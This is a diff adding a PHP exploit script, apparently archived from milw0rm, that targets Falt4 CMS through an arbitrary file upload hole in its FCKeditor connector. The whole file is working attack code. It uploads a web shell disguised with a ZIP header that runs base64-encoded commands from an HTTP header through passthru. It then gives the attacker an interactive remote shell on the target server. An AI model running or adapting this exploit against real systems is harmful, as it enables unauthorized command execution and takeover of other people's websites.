@@ -1,0 +1,95 @@
+################################################################
+#
+# Falt4 CMS (fckeditor) Arbitrary File Upload Exploit
+#
+# Bug Discovered By : Sp3shial
+#
+# Sp3shial@ymail.com
+#
+# Persian Boys Hacking Team From A Land With A History-Long Background
+#
+# Download CMS : http://downloads.sourceforge.net/falt4/falt4extreme.zip?modtime=1196845455&big_mirror=0
+#
+###############################################################
+
+error_reporting(0);
+set_time_limit(0);
+ini_set("default_socket_timeout", 5);
+
+define(STDIN, fopen("php://stdin", "r"));
+
+function http_send($host, $packet)
+{
+	$sock = fsockopen($host, 80);
+	while (!$sock)
+	{
+		print "\n[-] No response from {$host}:80 Trying again...";
+		$sock = fsockopen($host, 80);
+	}
+	fputs($sock, $packet);
+	while (!feof($sock)) $resp .= fread($sock, 1024);
+	fclose($sock);
+	return $resp;
+}
+
+function connector_response($html)
+{
+	return (preg_match("/OnUploadCompleted\((\d),\"(.*)\"\)/", $html, $match) && in_array($match[1], array(0, 201)));
+}
+
+print "\n+------------------------------------------------------------------+";
+print "\n| Falt4 CMS (fckeditor) Arbitrary File Upload Exploit by Sp3shial  |";
+print "\n+------------------------------------------------------------------+\n";
+
+if ($argc < 3)
+{
+	print "\nUsage......: php $argv[0] host path";
+	print "\nExample....: php $argv[0] localhost /";
+	print "\nExample....: php $argv[0] localhost /Falt4/\n";
+	die();
+}
+
+$host = $argv[1];
+$path = ereg_replace("(/){2,}", "/", $argv[2]);
+
+$filename  = md5(time()).".php";
+$connector = "modules/newsletter/FCKeditor/editor/filemanager/browser/default/connectors/php/connector.php";
+
+$payload  = "--o0oOo0o\r\n";
+$payload .= "Content-Disposition: form-data; name=\"NewFile\"; filename=\"{$filename}\"\r\n";
+$payload .= "Content-Type: application/zip\r\n\r\n";
+$payload .= "PK\003\004<?php error_reporting(0);print(\"_code_\\n\");passthru(base64_decode(\$_SERVER[HTTP_CMD])); ?>\n";
+$payload .= "--o0oOo0o--\r\n";
+
+$packet	 = "POST {$path}{$connector}?Command=FileUpload&Type=File&CurrentFolder=%2f HTTP/1.0\r\n";
+$packet	.= "Host: {$host}\r\n";
+$packet .= "Content-Length: ".strlen($payload)."\r\n";
+$packet .= "Content-Type: multipart/form-data; boundary=o0oOo0o\r\n";
+$packet .= "Connection: close\r\n\r\n";
+$packet .= $payload;
+
+if (!connector_response(http_send($host, $packet))) die("\n[-] Upload failed!\n");
+else print "\n[-] Shell uploaded to {$filename}...starting it!\n";
+
+$path .= str_repeat("../", substr_count($path, "/") - 1) . "UserFiles/File/"; // come back to the document root 
+
+$packet  = "GET {$path}{$filename} HTTP/1.0\r\n";
+$packet .= "Host: {$host}\r\n";
+$packet .= "Cmd: %s\r\n";
+$packet .= "Connection: close\r\n\r\n";
+
+while(1)
+{
+	print "\nFalt4-shell# ";
+	$cmd = trim(fgets(STDIN));
+	if ($cmd != "exit")
+	{
+		$response = http_send($host, sprintf($packet, base64_encode($cmd)));
+		preg_match("/_code_/", $response) ? print array_pop(explode("_code_", $response)) : die("\n[-] Exploit failed...\n");
+	}
+	else break;
+}
+
+?>
+
+# milw0rm.com [2009-02-16]
